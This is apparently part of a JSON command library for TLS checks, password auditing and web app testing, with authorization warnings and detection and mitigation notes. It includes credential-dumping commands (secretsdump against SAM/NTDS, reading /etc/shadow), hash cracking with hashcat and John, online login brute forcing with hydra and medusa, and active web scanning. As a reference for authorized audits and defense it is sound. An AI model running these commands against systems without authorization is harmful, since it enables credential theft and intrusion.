 {"id":"crt-key-cert-match","level":"intermediate","cat":"Certificates & TLS","title":"Confirm a key matches a certificate","desc":"Compare the public-key hash of a cert and key — matching MD5s mean they pair.","tags":["certificates","tls","detection"],"code":{"mac":"openssl x509 -noout -modulus -in {{CERT:cert.pem}} | openssl md5; openssl rsa -noout -modulus -in {{KEY:key.pem}} | openssl md5","linux":"openssl x509 -noout -modulus -in {{CERT:cert.pem}} | openssl md5; openssl rsa -noout -modulus -in {{KEY:key.pem}} | openssl md5"}},
 {"id":"crt-view-csr","level":"intermediate","cat":"Certificates & TLS","title":"Inspect and self-check a CSR","desc":"Print a certificate signing request's contents and verify its signature.","tags":["certificates","tls","reference"],"code":{"mac":"openssl req -in {{CSR:req.csr}} -noout -text -verify","linux":"openssl req -in {{CSR:req.csr}} -noout -text -verify"}},
 {"id":"crt-tls-version-enum","level":"intermediate","updated":"2026-07","cat":"Certificates & TLS","title":"Enumerate TLS versions a server accepts","desc":"Probe which TLS protocol versions a host negotiates to flag legacy TLS 1.0/1.1.","team":"purple","danger":"Authorized-use only: probe hosts you own or have written permission to assess.","tags":["tls","scanning","network"],"attack":["T1046"],"detect":"Server TLS/proxy logs and IDS show repeated short-lived handshakes from one source cycling protocol versions.","mitigate":"Disable TLS 1.0/1.1, require TLS 1.2+, and alert on handshakes negotiating deprecated versions.","code":{"mac":"for v in tls1 tls1_1 tls1_2 tls1_3; do echo -n \"$v: \"; echo | openssl s_client -connect {{HOST:example.com}}:443 -$v 2>/dev/null | grep -q 'Cipher' && echo ok || echo no; done","linux":"for v in tls1 tls1_1 tls1_2 tls1_3; do echo -n \"$v: \"; echo | openssl s_client -connect {{HOST:example.com}}:443 -$v 2>/dev/null | grep -q 'Cipher' && echo ok || echo no; done"}},
 {"id":"crt-list-ciphers","level":"intermediate","cat":"Certificates & TLS","title":"List cipher suites your OpenSSL supports","desc":"Expand a cipher string (e.g. HIGH) into the concrete suites the local build offers.","tags":["tls","reference"],"code":{"mac":"openssl ciphers -v '{{SPEC:HIGH:!aNULL}}'","linux":"openssl ciphers -v '{{SPEC:HIGH:!aNULL}}'"}},
 {"id":"crt-ocsp-uri","level":"intermediate","cat":"Certificates & TLS","title":"Find a cert's OCSP responder and CRL","desc":"Extract the revocation-checking URLs embedded in a certificate.","tags":["certificates","tls","detection"],"code":{"mac":"openssl x509 -in {{FILE:cert.pem}} -noout -ocsp_uri; openssl x509 -in {{FILE:cert.pem}} -noout -text | grep -A1 'CRL Distribution'","linux":"openssl x509 -in {{FILE:cert.pem}} -noout -ocsp_uri; openssl x509 -in {{FILE:cert.pem}} -noout -text | grep -A1 'CRL Distribution'"}},
 {"id":"crt-ca-store-linux","level":"intermediate","requires":{"elevation":true},"cat":"Certificates & TLS","title":"Trust a CA in the Linux system store","desc":"Add a CA to the OS trust anchor set (paths differ Debian vs RHEL).","danger":"Requires root and trusting a CA system-wide affects all TLS validation; only add CAs you trust.","tags":["certificates","tls","linux"],"code":{"linux":"sudo cp {{CA:myca.crt}} /usr/local/share/ca-certificates/ && sudo update-ca-certificates   # RHEL: cp to /etc/pki/ca-trust/source/anchors/ && sudo update-ca-trust extract   # list: trust list"}},
 {"id":"crt-ca-store-macos","level":"intermediate","requires":{"elevation":true},"cat":"Certificates & TLS","title":"Trust / list CAs in macOS keychain","desc":"Add a trusted root to the System keychain, or list existing certs.","danger":"add-trusted-cert needs sudo and modifies system trust; only trust CAs you control.","tags":["certificates","tls","macos"],"code":{"mac":"sudo security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain {{CA:myca.cer}}   # list: security find-certificate -a -p /System/Library/Keychains/SystemRootCertificates.keychain"}},
 {"id":"crt-win-cert-store","level":"intermediate","cat":"Certificates & TLS","title":"Browse Windows certificate stores","desc":"List certs in the user/machine stores via the Cert: drive or certutil.","tags":["certificates","tls","windows"],"code":{"ps":"Get-ChildItem Cert:\\CurrentUser\\My; Get-ChildItem Cert:\\LocalMachine\\Root | Select-Object Subject,NotAfter,Thumbprint","cmd":"certutil -store My & certutil -user -store My & certutil -store Root"}},

/* ================= PASSWORD AUDITING ================= */
 {"id":"pw-hashid","level":"intermediate","requires":{"tool":"hashid"},"related":["pw-hashcat-modes","pw-john-formats"],"cat":"Password Auditing","title":"Identify a hash type","desc":"Guess a hash's algorithm (and hashcat mode) before cracking. Requires hashid.","tags":["password","recon"],"code":{"linux":"hashid '{{HASH}}'\n# also print candidate hashcat -m mode numbers:\nhashid -m '{{HASH}}'","mac":"hashid '{{HASH}}'\nhashid -m '{{HASH}}'"}},
 {"id":"pw-hashcat-modes","level":"intermediate","requires":{"tool":"hashcat"},"related":["pw-hashcat-dict","pw-hashcat-rules"],"cat":"Password Auditing","title":"Find the hashcat mode number","desc":"Look up the -m mode number for a hash type from hashcat's built-in list. Requires hashcat.","tags":["password","reference"],"code":{"linux":"hashcat --help | grep -i '{{TYPE:ntlm}}'","mac":"hashcat --help | grep -i '{{TYPE:ntlm}}'","ps":"hashcat.exe --help | Select-String '{{TYPE:ntlm}}'"}},
 {"id":"pw-hashcat-dict","level":"intermediate","requires":{"tool":"hashcat"},"updated":"2026-07","related":["pw-hashcat-rules","pw-hashcat-mask"],"cat":"Password Auditing","title":"Dictionary attack (hashcat)","desc":"Straight wordlist attack against a hash file. Requires hashcat.","danger":"Authorized password-audit engagements only; crack only hashes you are permitted to test.","team":"red","tags":["password"],"attack":["T1110.002"],"detect":"Offline cracking runs on attacker hardware and is invisible to the target; detect the upstream hash theft (SAM/NTDS/LSASS access, exported hash files) that feeds it.","mitigate":"Enforce long passphrases and slow adaptive hashes (bcrypt/argon2/scrypt); rotate any credential whose hash may have been exposed.","code":{"linux":"hashcat -m {{MODE:0}} -a 0 hashes.txt {{WORDLIST:/usr/share/wordlists/rockyou.txt}}","mac":"hashcat -m {{MODE:0}} -a 0 hashes.txt {{WORDLIST:rockyou.txt}}","ps":"hashcat.exe -m {{MODE:0}} -a 0 hashes.txt {{WORDLIST:rockyou.txt}}"}},
 {"id":"pw-hashcat-rules","level":"intermediate","requires":{"tool":"hashcat"},"updated":"2026-07","related":["pw-hashcat-mask","pw-hashcat-show"],"cat":"Password Auditing","title":"Wordlist + rules attack (hashcat)","desc":"Expand a wordlist with mutation rules (e.g. best64) to catch mangled passwords. Requires hashcat.","danger":"Authorized password-audit engagements only.","team":"red","tags":["password"],"attack":["T1110.002"],"detect":"Not observable on the target; detect the credential dump that produced the hashes and treat exported hash files as a breach.","mitigate":"Require length over complexity; ban common bases/keyboard walks; use slow hashes so rule-mangling stays infeasible.","code":{"linux":"hashcat -m {{MODE:0}} -a 0 hashes.txt {{WORDLIST:/usr/share/wordlists/rockyou.txt}} -r {{RULES:/usr/share/hashcat/rules/best64.rule}}","mac":"hashcat -m {{MODE:0}} -a 0 hashes.txt {{WORDLIST:rockyou.txt}} -r {{RULES:/opt/homebrew/share/hashcat/rules/best64.rule}}","ps":"hashcat.exe -m {{MODE:0}} -a 0 hashes.txt {{WORDLIST:rockyou.txt}} -r {{RULES:rules\\best64.rule}}"}},
 {"id":"pw-hashcat-mask","level":"intermediate","requires":{"tool":"hashcat"},"updated":"2026-07","related":["pw-hashcat-show"],"cat":"Password Auditing","title":"Mask / brute-force attack (hashcat)","desc":"Brute-force a known password pattern with a charset mask (?l lower ?u upper ?d digit ?s special ?a all). Requires hashcat.","danger":"Authorized password-audit engagements only; masks can run for a very long time.","team":"red","tags":["password"],"attack":["T1110.002"],"detect":"Offline and invisible to the target; monitor instead for the hash exfiltration that precedes it.","mitigate":"Increase minimum length — each added character multiplies mask keyspace; enforce slow hashing.","code":{"linux":"hashcat -m {{MODE:0}} -a 3 hashes.txt '{{MASK:?u?l?l?l?l?d?d?d}}'","mac":"hashcat -m {{MODE:0}} -a 3 hashes.txt '{{MASK:?u?l?l?l?l?d?d?d}}'","ps":"hashcat.exe -m {{MODE:0}} -a 3 hashes.txt {{MASK:?u?l?l?l?l?d?d?d}}"}},
 {"id":"pw-hashcat-ntlm","level":"intermediate","requires":{"tool":"hashcat"},"updated":"2026-07","cat":"Password Auditing","title":"Crack Windows NTLM hashes","desc":"Audit NTLM (mode 1000) hashes pulled from a SAM/NTDS dump. Requires hashcat.","danger":"Authorized AD/password audits only.","team":"red","tags":["password","active-directory"],"attack":["T1110.002"],"detect":"Cracking itself is offline; detect the SAM/NTDS extraction (4662 replication, remote registry, secretsdump) that produced the NT hashes.","mitigate":"Enforce long passphrases; deploy LAPS for local admins; monitor and restrict credential dumping paths.","code":{"linux":"hashcat -m 1000 -a 0 nt-hashes.txt {{WORDLIST:/usr/share/wordlists/rockyou.txt}}","mac":"hashcat -m 1000 -a 0 nt-hashes.txt {{WORDLIST:rockyou.txt}}","ps":"hashcat.exe -m 1000 -a 0 nt-hashes.txt {{WORDLIST:rockyou.txt}}"}},
 {"id":"pw-hashcat-netntlmv2","level":"intermediate","requires":{"tool":"hashcat"},"updated":"2026-07","cat":"Password Auditing","title":"Crack NetNTLMv2 hashes","desc":"Audit captured NetNTLMv2 (mode 5600) challenge/response hashes. Requires hashcat.","danger":"Authorized engagements only; only crack responses you were permitted to capture.","team":"red","tags":["password","active-directory"],"attack":["T1110.002"],"detect":"The capture step (LLMNR/NBT-NS poisoning, SMB relay) is the observable event — watch for rogue responders and unexpected SMB auth; cracking is offline.","mitigate":"Disable LLMNR/NBT-NS; require SMB signing; enforce strong passwords so captured hashes stay uncrackable.","code":{"linux":"hashcat -m 5600 -a 0 netntlmv2.txt {{WORDLIST:/usr/share/wordlists/rockyou.txt}}","mac":"hashcat -m 5600 -a 0 netntlmv2.txt {{WORDLIST:rockyou.txt}}","ps":"hashcat.exe -m 5600 -a 0 netntlmv2.txt {{WORDLIST:rockyou.txt}}"}},
 {"id":"pw-hashcat-kerberoast","level":"intermediate","requires":{"tool":"hashcat"},"updated":"2026-07","cat":"Password Auditing","title":"Crack Kerberoast (TGS-REP) hashes","desc":"Audit service-account passwords from Kerberos TGS-REP tickets (mode 13100). Requires hashcat.","danger":"Authorized AD audits only.","team":"red","tags":["password","active-directory"],"attack":["T1558.003"],"detect":"Spike in TGS service-ticket requests (event 4769) with RC4 encryption (0x17) for many SPNs from one account.","mitigate":"Use 25+ char random passwords or gMSA for service accounts; disable RC4; alert on bulk 4769.","code":{"linux":"hashcat -m 13100 -a 0 tgs.txt {{WORDLIST:/usr/share/wordlists/rockyou.txt}}","mac":"hashcat -m 13100 -a 0 tgs.txt {{WORDLIST:rockyou.txt}}","ps":"hashcat.exe -m 13100 -a 0 tgs.txt {{WORDLIST:rockyou.txt}}"}},
 {"id":"pw-hashcat-asrep","level":"intermediate","requires":{"tool":"hashcat"},"updated":"2026-07","cat":"Password Auditing","title":"Crack AS-REP roasting hashes","desc":"Audit passwords of accounts with Kerberos pre-auth disabled (mode 18200). Requires hashcat.","danger":"Authorized AD audits only.","team":"red","tags":["password","active-directory"],"attack":["T1558.004"],"detect":"AS-REQ (event 4768) requesting RC4 tickets for accounts flagged 'do not require pre-auth', especially in bulk.","mitigate":"Require Kerberos pre-authentication on every account; use strong passwords; alert on DONT_REQ_PREAUTH.","code":{"linux":"hashcat -m 18200 -a 0 asrep.txt {{WORDLIST:/usr/share/wordlists/rockyou.txt}}","mac":"hashcat -m 18200 -a 0 asrep.txt {{WORDLIST:rockyou.txt}}","ps":"hashcat.exe -m 18200 -a 0 asrep.txt {{WORDLIST:rockyou.txt}}"}},
 {"id":"pw-hashcat-show","level":"intermediate","requires":{"tool":"hashcat"},"cat":"Password Auditing","title":"Show cracked hashes (potfile)","desc":"Print already-cracked plaintexts from the potfile without re-running. Requires hashcat.","tags":["password","reference"],"code":{"linux":"hashcat -m {{MODE:1000}} hashes.txt --show","mac":"hashcat -m {{MODE:1000}} hashes.txt --show","ps":"hashcat.exe -m {{MODE:1000}} hashes.txt --show"}},
 {"id":"pw-hashcat-benchmark","level":"intermediate","requires":{"tool":"hashcat"},"cat":"Password Auditing","title":"Benchmark cracking speed","desc":"Measure hashes/second for a mode on this hardware to size an audit. Requires hashcat.","tags":["password","reference"],"code":{"linux":"hashcat -b -m {{MODE:1000}}","mac":"hashcat -b -m {{MODE:1000}}","ps":"hashcat.exe -b -m {{MODE:1000}}"}},
 {"id":"pw-john-basic","level":"intermediate","requires":{"tool":"john"},"updated":"2026-07","related":["pw-john-wordlist","pw-john-show"],"cat":"Password Auditing","title":"Crack with John (default mode)","desc":"Run John the Ripper's default single/wordlist/incremental pipeline over a hash file. Requires John the Ripper.","danger":"Authorized password audits only.","team":"red","tags":["password"],"attack":["T1110.002"],"detect":"Offline; detect the credential theft that produced the hash file rather than the crack itself.","mitigate":"Enforce long passphrases and slow hashes; rotate exposed credentials.","code":{"linux":"john hashes.txt\n# then view results:\njohn --show hashes.txt","mac":"john hashes.txt\njohn --show hashes.txt","ps":"john.exe hashes.txt"}},
 {"id":"pw-john-wordlist","level":"intermediate","requires":{"tool":"john"},"updated":"2026-07","cat":"Password Auditing","title":"John wordlist + mangling rules","desc":"Dictionary attack with John's rule-based mangling and an explicit hash format. Requires John the Ripper.","danger":"Authorized password audits only.","team":"red","tags":["password"],"attack":["T1110.002"],"detect":"Not observable on the target; treat any exported hash file as evidence of a prior credential-access breach.","mitigate":"Ban common password bases; require length; use adaptive slow hashing.","code":{"linux":"john --format={{FORMAT:nt}} --wordlist={{WORDLIST:/usr/share/wordlists/rockyou.txt}} --rules hashes.txt","mac":"john --format={{FORMAT:nt}} --wordlist={{WORDLIST:rockyou.txt}} --rules hashes.txt","ps":"john.exe --format={{FORMAT:nt}} --wordlist={{WORDLIST:rockyou.txt}} --rules hashes.txt"}},
 {"id":"pw-john-formats","level":"intermediate","requires":{"tool":"john"},"cat":"Password Auditing","title":"List John supported formats","desc":"Show every hash format John can crack so you can pick --format. Requires John the Ripper.","tags":["password","reference"],"code":{"linux":"john --list=formats\n# detailed view:\njohn --list=format-details | less","mac":"john --list=formats","ps":"john.exe --list=formats"}},
 {"id":"pw-john-unshadow","level":"intermediate","requires":{"elevation":true},"updated":"2026-07","related":["pw-john-basic","pw-john-wordlist"],"cat":"Password Auditing","title":"Merge passwd + shadow for John","desc":"Combine /etc/passwd and /etc/shadow into one crackable file for a local-account audit. Requires John the Ripper + root.","danger":"Reads /etc/shadow; root required. Authorized audits of systems you administer only.","team":"red","tags":["password","linux"],"attack":["T1003.008"],"detect":"Auditd: root read of /etc/shadow, or creation of a combined credentials file; unexpected sudo to john/unshadow.","mitigate":"Restrict root; monitor access to /etc/shadow; enforce SHA-512/yescrypt with strong passwords.","code":{"linux":"sudo unshadow /etc/passwd /etc/shadow > unshadowed.txt\njohn unshadowed.txt"}},
 {"id":"pw-john-show","level":"intermediate","requires":{"tool":"john"},"cat":"Password Auditing","title":"Show John-cracked passwords","desc":"Print plaintexts John has already recovered for a hash file. Requires John the Ripper.","tags":["password","reference"],"code":{"linux":"john --show --format={{FORMAT:nt}} hashes.txt","mac":"john --show --format={{FORMAT:nt}} hashes.txt","ps":"john.exe --show --format={{FORMAT:nt}} hashes.txt"}},
 {"id":"pw-hashfile-extract","level":"intermediate","updated":"2026-07","cat":"Password Auditing","title":"Extract hash from protected file","desc":"Pull a crackable hash from a password-protected archive/document via zip2john / office2john / pdf2john. Requires John the Ripper (jumbo).","danger":"Audit only files you own or are authorized to test.","team":"red","tags":["password"],"attack":["T1110.002"],"detect":"Offline conversion — not visible on the network; the risk is the protected file itself being accessible to an attacker.","mitigate":"Use strong passphrases on protected files; prefer authenticated encryption; limit file distribution.","code":{"linux":"zip2john {{FILE:secret.zip}} > file.hash\n# or: office2john {{FILE:secret.docx}} > file.hash\n# or: pdf2john {{FILE:secret.pdf}} > file.hash\njohn file.hash","mac":"zip2john {{FILE:secret.zip}} > file.hash\njohn file.hash"}},
 {"id":"pw-hydra-ssh","level":"intermediate","requires":{"tool":"hydra"},"updated":"2026-07","cat":"Password Auditing","title":"SSH login testing (hydra)","desc":"Test one account against a password list over SSH. Requires hydra.","danger":"Online guessing causes lockouts and noisy logs; authorized targets only.","team":"red","tags":["password","remote"],"attack":["T1110.001"],"detect":"Burst of 'Failed password' entries in /var/log/auth.log from one source IP hitting sshd repeatedly.","mitigate":"Key-only auth, fail2ban/rate limiting, MFA, and account lockout thresholds.","code":{"linux":"hydra -l {{USER:admin}} -P {{WORDLIST:/usr/share/wordlists/rockyou.txt}} ssh://{{TARGET:10.0.0.5}}","mac":"hydra -l {{USER:admin}} -P {{WORDLIST:rockyou.txt}} ssh://{{TARGET:10.0.0.5}}"}},
 {"id":"pw-hydra-http","level":"intermediate","requires":{"tool":"hydra"},"updated":"2026-07","cat":"Password Auditing","title":"Web login form testing (hydra)","desc":"Probe an HTTP POST login form for weak credentials (F= marks the failure string). Requires hydra.","danger":"Authorized web-app assessments only.","team":"red","tags":["password","web"],"attack":["T1110.001"],"detect":"Web/WAF logs show many POSTs to the login endpoint with 401/302 from one IP; failed-login metric spike.","mitigate":"CAPTCHA after failures, per-account lockout, WAF rate limiting, and MFA.","code":{"linux":"hydra -l {{USER:admin}} -P {{WORDLIST:/usr/share/wordlists/rockyou.txt}} {{TARGET:10.0.0.5}} http-post-form \"/login:user=^USER^&pass=^PASS^:F=Invalid\"","mac":"hydra -l {{USER:admin}} -P {{WORDLIST:rockyou.txt}} {{TARGET:10.0.0.5}} http-post-form \"/login:user=^USER^&pass=^PASS^:F=Invalid\""}},
 {"id":"pw-medusa","level":"intermediate","requires":{"tool":"medusa"},"updated":"2026-07","cat":"Password Auditing","title":"Parallel login testing (medusa)","desc":"Modular, threaded credential testing against a service (-M ssh, ftp, smbnt, http...). Requires medusa.","danger":"Online, noisy, lockout-prone; authorized targets only.","team":"red","tags":["password","remote"],"attack":["T1110.001"],"detect":"Rapid parallel auth failures across accounts/services from one source; SIEM login-failure spike.","mitigate":"Lockout thresholds, rate limiting, MFA, and network segmentation of management services.","code":{"linux":"medusa -h {{TARGET:10.0.0.5}} -u {{USER:admin}} -P {{WORDLIST:/usr/share/wordlists/rockyou.txt}} -M ssh","mac":"medusa -h {{TARGET:10.0.0.5}} -u {{USER:admin}} -P {{WORDLIST:rockyou.txt}} -M ssh"}},
 {"id":"pw-secretsdump","level":"intermediate","updated":"2026-07","related":["pw-hashcat-ntlm","pw-hashcat-netntlmv2"],"cat":"Password Auditing","title":"Dump hashes for offline audit (secretsdump)","desc":"Extract SAM/LSA/NTDS password hashes remotely or from offline hive files for audit. Requires impacket (secretsdump.py).","danger":"Highly sensitive; domain/admin credentials required. Authorized AD audits only.","team":"red","tags":["password","active-directory","post-ex"],"attack":["T1003.002","T1003.003"],"detect":"Network admin logon (4624/4672) plus remote registry or DRSUAPI/DCSync replication (4662 with replication GUID); impacket service artifacts.","mitigate":"Tiered admin, restrict DC logons, monitor DCSync rights, deploy LAPS, and alert on remote SAM/NTDS access.","code":{"linux":"secretsdump.py {{DOMAIN:CORP}}/{{USER:admin}}@{{TARGET:10.0.0.5}}\n# from offline registry hives:\nsecretsdump.py -sam SAM -system SYSTEM LOCAL","mac":"secretsdump.py {{DOMAIN:CORP}}/{{USER:admin}}@{{TARGET:10.0.0.5}}"}},
 {"id":"pw-wordlist-gen","level":"intermediate","requires":{"tool":"cewl"},"cat":"Password Auditing","title":"Build a target wordlist","desc":"Spider a site for candidate words (cewl) or generate patterned combinations (crunch). Requires cewl / crunch.","tags":["password","recon"],"code":{"linux":"cewl {{URL:http://target.example}} -m 6 -w words.txt\n# fixed-length pattern (@=lower %=digit):\ncrunch 8 8 -t Pass@@%% -o crunch.txt","mac":"crunch 8 8 -t Pass@@%% -o crunch.txt"}},
 {"id":"pw-policy-windows","level":"intermediate","cat":"Password Auditing","title":"Audit Windows password policy","desc":"Review length, age, history, and lockout settings on a workstation or domain.","tags":["password","account"],"code":{"ps":"net accounts\n# export the local security policy and pull password/lockout lines:\nsecedit /export /cfg \"$env:TEMP\\secpol.cfg\" | Out-Null\nSelect-String -Path \"$env:TEMP\\secpol.cfg\" -Pattern 'Password|Lockout'","cmd":"net accounts\nnet accounts /domain"}},
 {"id":"pw-policy-linux","level":"intermediate","requires":{"elevation":true},"cat":"Password Auditing","title":"Audit Unix password policy","desc":"Review password aging and complexity requirements for accounts.","tags":["password","account"],"code":{"linux":"chage -l {{USER:root}}\ngrep -E 'PASS_(MAX|MIN|WARN)_' /etc/login.defs\ngrep -E 'minlen|dcredit|ucredit|ocredit' /etc/security/pwquality.conf 2>/dev/null","mac":"pwpolicy -getaccountpolicies 2>/dev/null\nsudo pwpolicy -u {{USER:admin}} -getpolicy"}},

/* ================= WEB APP TESTING ================= */
 {"id":"web-curl-headers","level":"intermediate","updated":"2026-07","cat":"Web App Testing","title":"Inspect HTTP headers with curl","desc":"Fetch response headers and the server banner with a curl HEAD request (-I).","team":"red","tags":["web","recon"],"attack":["T1594"],"detect":"Web/proxy access logs record HEAD requests and the client User-Agent (curl/x.y).","mitigate":"Suppress or genericize Server and X-Powered-By banners; flag default tool User-Agents at the WAF.","danger":"Authorized testing only; passive but still logged against the target.","code":{"ps":"curl.exe -I https://{{TARGET:example.com}}","cmd":"curl -I https://{{TARGET:example.com}}","mac":"curl -I https://{{TARGET:example.com}}","linux":"curl -I https://{{TARGET:example.com}}"}},
 {"id":"web-curl-methods","level":"intermediate","updated":"2026-07","cat":"Web App Testing","title":"Enumerate allowed HTTP methods","desc":"Send an OPTIONS request with curl and read the Allow header to see permitted verbs.","team":"red","tags":["web","enumeration"],"attack":["T1594"],"detect":"Access logs show OPTIONS/TRACE/PUT requests, which are rare in normal browsing.","mitigate":"Disable unused methods (TRACE, PUT, DELETE) at the web server; return 405 for them.","danger":"Authorized testing only; verb probing may trip WAF method-based rules.","code":{"ps":"curl.exe -i -s -X OPTIONS https://{{TARGET:example.com}}","cmd":"curl -i -s -X OPTIONS https://{{TARGET:example.com}}","mac":"curl -i -s -X OPTIONS https://{{TARGET:example.com}}","linux":"curl -i -s -X OPTIONS https://{{TARGET:example.com}}"}},
 {"id":"web-security-headers","level":"intermediate","updated":"2026-07","cat":"Web App Testing","title":"Check for missing security headers","desc":"Grep the response headers for HSTS, CSP, and framing/content-type protections.","team":"red","tags":["web","recon"],"attack":["T1594"],"detect":"Nearly indistinguishable from normal traffic beyond repeated header-only fetches in logs.","mitigate":"Deploy HSTS, CSP, X-Frame-Options, X-Content-Type-Options, and Referrer-Policy.","danger":"Passive read of headers; run only against systems you are authorized to test.","code":{"ps":"curl.exe -sI https://{{TARGET:example.com}} | Select-String 'Strict-Transport|Content-Security|X-Frame|X-Content-Type|Referrer-Policy'","mac":"curl -sI https://{{TARGET:example.com}} | grep -iE 'strict-transport|content-security|x-frame|x-content-type|referrer-policy'","linux":"curl -sI https://{{TARGET:example.com}} | grep -iE 'strict-transport|content-security|x-frame|x-content-type|referrer-policy'"}},
 {"id":"web-cors","level":"intermediate","updated":"2026-07","cat":"Web App Testing","title":"Test CORS reflection with curl","desc":"Send a crafted Origin header and inspect Access-Control-Allow-Origin for permissive reflection.","team":"red","tags":["web","enumeration"],"attack":["T1595"],"detect":"WAF/app logs show requests carrying anomalous or attacker-controlled Origin headers.","mitigate":"Whitelist explicit origins; never reflect an arbitrary Origin alongside Allow-Credentials: true.","danger":"Authorized testing only; demonstrates data-exposure risk, do not exfiltrate real data.","code":{"ps":"curl.exe -s -I -H \"Origin: https://evil.example\" https://{{TARGET:example.com}} | Select-String 'Access-Control'","mac":"curl -s -I -H 'Origin: https://evil.example' https://{{TARGET:example.com}} | grep -i access-control","linux":"curl -s -I -H 'Origin: https://evil.example' https://{{TARGET:example.com}} | grep -i access-control"}},
 {"id":"web-robots","level":"intermediate","updated":"2026-07","cat":"Web App Testing","title":"Read robots.txt and sitemap","desc":"Retrieve robots.txt to surface disallowed or hidden paths a site advertises.","team":"red","tags":["web","recon"],"attack":["T1594"],"detect":"Requests to /robots.txt and /sitemap.xml appear in access logs (also normal for crawlers).","mitigate":"Never rely on robots.txt to hide sensitive paths; enforce authentication and authorization.","danger":"Passive retrieval; authorized testing only.","code":{"ps":"curl.exe -s https://{{TARGET:example.com}}/robots.txt","cmd":"curl -s https://{{TARGET:example.com}}/robots.txt","mac":"curl -s https://{{TARGET:example.com}}/robots.txt","linux":"curl -s https://{{TARGET:example.com}}/robots.txt"}},
 {"id":"web-whatweb","level":"intermediate","requires":{"tool":"whatweb"},"updated":"2026-07","cat":"Web App Testing","title":"Fingerprint web tech with whatweb","desc":"Identify CMS, frameworks, and versions with whatweb (non-default tool; -a sets aggression 1-4).","team":"red","tags":["web","recon"],"attack":["T1592.002"],"detect":"Bursts of requests with the whatweb User-Agent and probing of known fingerprint paths.","mitigate":"Strip version banners; deploy a WAF to rate-limit and block scanner signatures.","danger":"Authorized testing only; aggression level 3+ actively probes the application.","code":{"linux":"whatweb -a 3 https://{{TARGET:example.com}}"}},
 {"id":"web-wafw00f","level":"intermediate","requires":{"tool":"wafw00f"},"updated":"2026-07","cat":"Web App Testing","title":"Detect a WAF with wafw00f","desc":"Fingerprint the WAF or CDN protecting a site with wafw00f (non-default tool).","team":"red","tags":["web","recon"],"attack":["T1595"],"detect":"A sequence of deliberately malicious-looking probes crafted to trigger WAF fingerprints.","mitigate":"Configure the WAF to respond uniformly so it cannot be fingerprinted; monitor probe patterns.","danger":"Authorized testing only; sends benign attack-like payloads to elicit WAF responses.","code":{"mac":"wafw00f https://{{TARGET:example.com}}","linux":"wafw00f https://{{TARGET:example.com}}"}},
 {"id":"web-nikto","level":"intermediate","requires":{"tool":"nikto"},"updated":"2026-07","cat":"Web App Testing","title":"Scan a web server with nikto","desc":"Check a web server for known issues, misconfigurations, and risky files with nikto (non-default).","team":"red","tags":["web","scanning"],"attack":["T1595.002"],"detect":"Very noisy: thousands of requests, the nikto User-Agent, and many 404s on nonexistent paths.","mitigate":"WAF signature blocking, per-IP rate limiting, and removal of default and sample files.","danger":"Authorized testing only; loud, easily attributed, and can destabilize fragile apps.","code":{"mac":"nikto -h https://{{TARGET:example.com}}","linux":"nikto -h https://{{TARGET:example.com}}"}},
 {"id":"web-nuclei","level":"intermediate","requires":{"tool":"nuclei"},"updated":"2026-07","cat":"Web App Testing","title":"Template scanning with nuclei","desc":"Run community vulnerability templates against a target with nuclei (ProjectDiscovery; non-default).","team":"red","tags":["web","scanning"],"attack":["T1595.002"],"detect":"High request volume matching known nuclei template paths and payloads in WAF logs.","mitigate":"Keep software patched; block scanner signatures; rate-limit per source IP.","danger":"Authorized testing only; some templates send active exploit checks.","code":{"mac":"nuclei -u https://{{TARGET:example.com}} -severity critical,high,medium","linux":"nuclei -u https://{{TARGET:example.com}} -severity critical,high,medium"}},
 {"id":"web-nmap-http","level":"intermediate","requires":{"tool":"nmap"},"updated":"2026-07","cat":"Web App Testing","title":"Nmap HTTP NSE enumeration","desc":"Enumerate web server details with nmap HTTP scripts (http-title, http-headers, http-enum, http-methods).","team":"red","tags":["web","scanning"],"attack":["T1595.002"],"detect":"Port scan plus scripted HTTP probes to common paths, visible in IDS and access logs.","mitigate":"Restrict exposure, patch, and alert on http-enum's characteristic path sweeps.","danger":"Authorized testing only; http-enum probes many paths and is easily noticed.","code":{"mac":"nmap -p 80,443 --script \"http-title,http-headers,http-enum,http-methods\" {{TARGET:example.com}}","linux":"nmap -p 80,443 --script \"http-title,http-headers,http-enum,http-methods\" {{TARGET:example.com}}"}},
 {"id":"web-gobuster-dir","level":"intermediate","requires":{"tool":"gobuster"},"updated":"2026-07","related":["web-ffuf-param","web-feroxbuster"],"cat":"Web App Testing","title":"Directory brute force with gobuster","desc":"Brute-force directories and files from a wordlist with gobuster dir (non-default; -t threads).","team":"red","tags":["web","enumeration"],"attack":["T1595.003"],"detect":"Large spike of 404s from one IP with a wordlist User-Agent and sequential path guessing.","mitigate":"Rate-limit, block on excessive 404s, and keep sensitive files out of the web root.","danger":"Authorized testing only; high request volume can degrade the target.","code":{"mac":"gobuster dir -u https://{{TARGET:example.com}} -w {{WORDLIST:/usr/share/wordlists/dirb/common.txt}} -t 50","linux":"gobuster dir -u https://{{TARGET:example.com}} -w {{WORDLIST:/usr/share/wordlists/dirb/common.txt}} -t 50"}},
 {"id":"web-ffuf-dir","level":"intermediate","requires":{"tool":"ffuf"},"updated":"2026-07","cat":"Web App Testing","title":"Directory fuzzing with ffuf","desc":"Fuzz directories/files using the FUZZ keyword with ffuf (non-default; -mc filters match codes).","team":"red","tags":["web","enumeration"],"attack":["T1595.003"],"detect":"Rapid path enumeration with the ffuf User-Agent and many 404/403 responses.","mitigate":"Rate-limit per IP, deploy a WAF, and ensure no sensitive files are exposed.","danger":"Authorized testing only; can generate heavy load on the target.","code":{"mac":"ffuf -w {{WORDLIST:/usr/share/wordlists/dirb/common.txt}}:FUZZ -u https://{{TARGET:example.com}}/FUZZ -mc 200,204,301,302,307,401,403","linux":"ffuf -w {{WORDLIST:/usr/share/wordlists/dirb/common.txt}}:FUZZ -u https://{{TARGET:example.com}}/FUZZ -mc 200,204,301,302,307,401,403"}},
